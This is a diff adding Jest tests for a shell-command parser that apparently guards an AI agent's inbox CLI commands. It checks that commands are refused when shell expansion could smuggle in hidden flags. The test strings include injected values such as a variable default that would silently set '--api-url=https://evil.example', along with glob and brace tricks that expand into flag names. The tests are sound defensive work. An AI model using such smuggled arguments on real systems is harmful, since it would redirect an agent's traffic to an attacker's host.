@@ -44,6 +44,36 @@ describe('simpleCommandWords', () => {
       expect(simpleCommandWords(command), command).toBeNull();
     }
   });
+
+  it('refuses a word the shell would turn into another, such as a flag it never showed', () => {
+    for (const command of [
+      // An unset variable's default: `--api-url=https://evil.example` once the shell has read it.
+      'npx @agentinbox/cli inbox reply conv_1 hi ${UNSET:---api-url=https://evil.example}',
+      'npx @agentinbox/cli inbox reply conv_1 hi "${UNSET:---api-url=https://evil.example}"',
+      'npx @agentinbox/cli inbox reply conv_1 hi $FLAGS',
+      'npx @agentinbox/cli inbox reply conv_1 "costs $5"',
+      // A file the agent made can be named like a flag: a pattern turns into its name.
+      'npx @agentinbox/cli inbox reply conv_1 hi *',
+      'npx @agentinbox/cli inbox reply conv_1 hi --?pi-url=x',
+      'npx @agentinbox/cli inbox reply conv_1 hi [-]-api-url=x',
+      'npx @agentinbox/cli inbox reply conv_1 hi {--api-url=x,}',
+    ]) {
+      expect(simpleCommandWords(command), command).toBeNull();
+    }
+  });
+
+  it('still reads those characters where the shell leaves them be: single quotes, a backslash, double quotes', () => {
+    expect(simpleCommandWords(`npx @agentinbox/cli inbox reply conv_1 'costs $5 * {a,b}?' \\$6 "[ok] *{x}"`)).toEqual([
+      'npx',
+      '@agentinbox/cli',
+      'inbox',
+      'reply',
+      'conv_1',
+      'costs $5 * {a,b}?',
+      '$6',
+      '[ok] *{x}',
+    ]);
+  });
 });
 
 describe('isOwnReply', () => {
